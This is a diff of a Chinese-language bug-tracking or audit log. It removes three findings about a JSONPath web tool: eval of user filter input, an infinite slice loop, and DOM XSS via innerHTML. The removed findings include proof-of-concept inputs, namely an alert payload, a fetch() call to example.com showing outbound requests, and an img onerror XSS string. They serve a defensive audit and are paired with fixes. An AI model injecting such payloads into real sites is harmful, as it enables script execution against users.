@@ -3828,36 +3828,6 @@
 
 ## X 批 · IT 速查/编码 II（2026-11-04）
 
-### IT-N488 — JSONPath 过滤表达式直接 eval 用户输入（安全，高）
-- 页面：`tools/it/json-path.html`
-- 行号：`tools/it/json-path.html:509`（调用处 `:501`，过滤分支 `:386`）
-- 问题：`evalFilter()` 仅把 `@.prop` 替换成对应值，随后 `return eval(expr)`，而 `expr` 来自用户在路径输入框里写的 `[?(...)]`。等于把用户输入当 JavaScript 执行。
-- 复现：输入 JSON `{"a":[1]}`，路径填 `$.a[?(alert(document.domain))]` → 直接弹窗；填 `[?(fetch('https://example.com/x'))]` 可外发请求。
-- 期望：过滤表达式按白名单语法（比较、逻辑、括号、字面量）自行解析，不做 `eval`。
-- 影响：任意 JS 在页面源执行（自触发型，需受害者粘贴表达式，但属于可控代码执行）。
-- 方案：删除 `eval`，改为分词 + 递归下降求值；至少用 `new Function` 也不行（同样可逃逸）。
-- 假工具：否
-
-### IT-N489 — JSONPath 开区间切片死循环，点击自带预设即冻结标签页（高）
-- 页面：`tools/it/json-path.html`
-- 行号：`tools/it/json-path.html:376`、`tools/it/json-path.html:466`、预设 `tools/it/json-path.html:196`
-- 问题：解析 `[-1:]`、`[0:]`、`[1:]` 这类省略上界的切片时，`end` 被赋成 `Infinity`；执行处 `for (let i = token.start; i < token.end; i += step)` 的条件恒真，循环永不退出。
-- 复现：用 `node` 复刻 `parseTokens`/切片循环，加入 50 步上限：`$.store.book[-1:]` 得到 `[20, 8, 10, 12, 20]` 后仍继续（判定 `INFINITE`），且负索引起点把末项重复取了一次；`[0:]` 同样判定 `INFINITE`。页面「$.store.book[-1:] 最后一个」预设（`:196`）点击即触发。
-- 期望：省略上界按 `current.length` 处理，负起点先折算成 `length + start`。
-- 影响：任何开区间切片都会卡死页面；自带预设之一必现。另 `[0:5:2]` 的步长被忽略（解析出 `end=5`、`step` 缺省 1），与公式「按步长遍历」不符。
-- 方案：解析阶段不要写入 `Infinity`，运行时按当前数组长度收敛；补齐 `step` 解析。
-- 假工具：否
-
-### IT-N490 — JSONPath 高亮结果拼进 innerHTML，JSON 字符串可注入 HTML（安全，高）
-- 页面：`tools/it/json-path.html`
-- 行号：`tools/it/json-path.html:516`（输出 `:557`）
-- 问题：`highlightJSON()` 只做正则加 `<span>`，原样保留 `JSON.stringify` 的内容；`JSON.stringify` 不转义 `<`、`>`、`&`，结果又被赋给 `output.innerHTML`。
-- 复现：输入 `{"a":"<img src=x onerror=alert(1)>"}`，路径 `$` → 生成 `<span class="jh-string">"<img src=x onerror=alert(1)>"</span>`，图片加载失败即执行脚本。
-- 期望：先对 JSON 文本做 HTML 转义再着色，或改用 `textContent` + DOM 节点着色。
-- 影响：任意 HTML/脚本注入（同样是自触发，但属于真实 DOM XSS sink）。
-- 方案：`escapeHtml(jsonStr)` 后再跑正则；或按 token 建节点。
-- 假工具：否
-
 ### IT-N491 — Codabar 编码表大面积非法，默认预设起止符就错（高）
 - 页面：`tools/it/barcode-codabar.html`
 - 行号：`tools/it/barcode-codabar.html:277`–`:282`
